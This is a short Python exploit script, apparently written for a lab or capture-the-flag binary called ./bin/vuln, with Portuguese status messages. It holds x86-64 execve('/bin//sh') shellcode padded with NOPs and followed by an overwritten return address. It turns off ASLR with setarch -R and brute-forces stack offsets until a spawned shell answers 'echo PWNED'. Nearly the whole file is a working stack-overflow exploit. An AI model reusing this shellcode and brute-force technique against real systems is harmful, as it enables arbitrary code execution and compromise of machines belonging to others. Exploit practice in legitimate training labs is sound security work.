# bruteforce_addr.py
import subprocess, struct, sys

BASE = 0x7fffffffe460 

def check(offset):
    addr = BASE + offset
    
    sc = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
    
    payload = sc + (b"\x90" * (56 - len(sc)))
    payload += struct.pack("<Q", addr)[:6]

    cmd = ["setarch", "x86_64", "-R", "./bin/vuln", "admin", payload]
    
    try:
        p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        p.stdin.write(b"echo PWNED\n")
        p.stdin.flush()
        
        out, _ = p.communicate(timeout=0.1)
        return b"PWNED" in out
        
    except Exception:
        return False

print(f"procurando offset da stack perto de {hex(BASE)}...")

for off in range(-512, 512, 16):
    if check(off):
        print(f"ENCONTRADO! Offset: {off}")
        print(f"Endereço da Stack: {hex(BASE + off)}")
        sys.exit(0)
        
print("sem sorte.")
